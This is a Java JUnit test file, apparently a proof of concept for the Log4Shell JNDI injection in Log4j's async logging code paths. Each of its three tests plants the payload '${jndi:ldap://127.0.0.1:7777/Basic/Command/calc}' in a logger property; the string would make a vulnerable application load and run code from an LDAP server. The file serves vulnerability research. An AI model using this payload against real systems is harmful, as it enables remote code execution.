import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.Appender;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.appender.FileAppender;
import org.apache.logging.log4j.core.async.AsyncLogger;
import org.apache.logging.log4j.core.async.RingBufferLogEvent;
import org.apache.logging.log4j.core.async.RingBufferLogEventHandler;
import org.apache.logging.log4j.core.config.*;

import org.apache.logging.log4j.core.impl.ContextDataFactory;
import org.apache.logging.log4j.core.impl.MutableLogEvent;
import org.apache.logging.log4j.core.layout.PatternLayout;
import org.apache.logging.log4j.core.util.Clock;
import org.apache.logging.log4j.core.util.SystemMillisClock;
import org.apache.logging.log4j.core.util.SystemNanoClock;
import org.apache.logging.log4j.util.StringMap;
import org.junit.jupiter.api.Test;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;

public class LoggerPocTests {

    @Test
    public void actualAsyncLogAsyncLoggerTest() throws IOException {
        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();

        final LoggerContext ctx = new LoggerContext("TestContext");
        final Configuration config = ctx.getConfiguration();

        Appender appender = FileAppender.createAppender("target/test.log", "false", "false", "File", "true", "false", "false", "4000", layout, null, "false", null, config);
        appender.start();
        config.addAppender(appender);

        Property[] properties = new Property[]{
                Property.createProperty("keyA", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
        };


        AppenderRef ref = AppenderRef.createAppenderRef("File", null, null);
        AppenderRef[] refs = new AppenderRef[]{ref};


        LoggerConfig loggerConfig = LoggerConfig.createLogger(
                "false", // additivity
                Level.INFO, // level
                "TestLogger", // loggerName
                "true", // includeLocation
                refs, // AppenderRef array
                properties, // Property array
                config, // current Configuration
                null // Filter
        );

        loggerConfig.addAppender(appender, null, null);
        config.addLogger("TestLogger", loggerConfig);

        AsyncLogger logger = new AsyncLogger(ctx, "TestLogger", null, null);
        logger.actualAsyncLog(new RingBufferLogEvent());
    }

    @Test
    public void executeRingBufferLogEventTest() {
        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();

        final LoggerContext ctx = new LoggerContext("TestContext");
        final Configuration config = ctx.getConfiguration();

        Appender appender = FileAppender.createAppender("target/test.log", "false", "false", "File", "true", "false", "false", "4000", layout, null, "false", null, config);
        appender.start();
        config.addAppender(appender);

        Property[] properties = new Property[]{
                Property.createProperty("keyA", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
        };


        AppenderRef ref = AppenderRef.createAppenderRef("File", null, null);
        AppenderRef[] refs = new AppenderRef[]{ref};


        LoggerConfig loggerConfig = LoggerConfig.createLogger(
                "false", // additivity
                Level.INFO, // level
                "TestLogger", // loggerName
                "true", // includeLocation
                refs, // AppenderRef array
                properties, // Property array
                config, // current Configuration
                null // Filter
        );

        loggerConfig.addAppender(appender, null, null);
        config.addLogger("TestLogger", loggerConfig);

        AsyncLogger logger = new AsyncLogger(ctx, "TestLogger", null, null);

        StringMap data = ContextDataFactory.createContextData();

        RingBufferLogEvent bufferLogEvent = new RingBufferLogEvent();
        bufferLogEvent.setValues(logger, null, null, null, null, new MutableLogEvent(), null, data, null, 1, null, 1, null,
                new SystemMillisClock(), new SystemNanoClock());
        bufferLogEvent.execute(true);
    }

    @Test
    public void onEventRingBufferLogEventHandlerTest() throws Exception {
        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();

        final LoggerContext ctx = new LoggerContext("TestContext");
        final Configuration config = ctx.getConfiguration();

        Appender appender = FileAppender.createAppender("target/test.log", "false", "false", "File", "true", "false", "false", "4000", layout, null, "false", null, config);
        appender.start();
        config.addAppender(appender);

        Property[] properties = new Property[]{
                Property.createProperty("keyA", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
        };


        AppenderRef ref = AppenderRef.createAppenderRef("File", null, null);
        AppenderRef[] refs = new AppenderRef[]{ref};


        LoggerConfig loggerConfig = LoggerConfig.createLogger(
                "false", // additivity
                Level.INFO, // level
                "TestLogger", // loggerName
                "true", // includeLocation
                refs, // AppenderRef array
                properties, // Property array
                config, // current Configuration
                null // Filter
        );

        loggerConfig.addAppender(appender, null, null);
        config.addLogger("TestLogger", loggerConfig);

        AsyncLogger logger = new AsyncLogger(ctx, "TestLogger", null, null);

        StringMap data = ContextDataFactory.createContextData();

        RingBufferLogEvent bufferLogEvent = new RingBufferLogEvent();
        bufferLogEvent.setValues(logger, null, null, null, null, new MutableLogEvent(), null, data, null, 1, null, 1, null,
                new SystemMillisClock(), new SystemNanoClock());

        RingBufferLogEventHandler handler = new RingBufferLogEventHandler();
        handler.onEvent(bufferLogEvent, 0, true);
    }

}
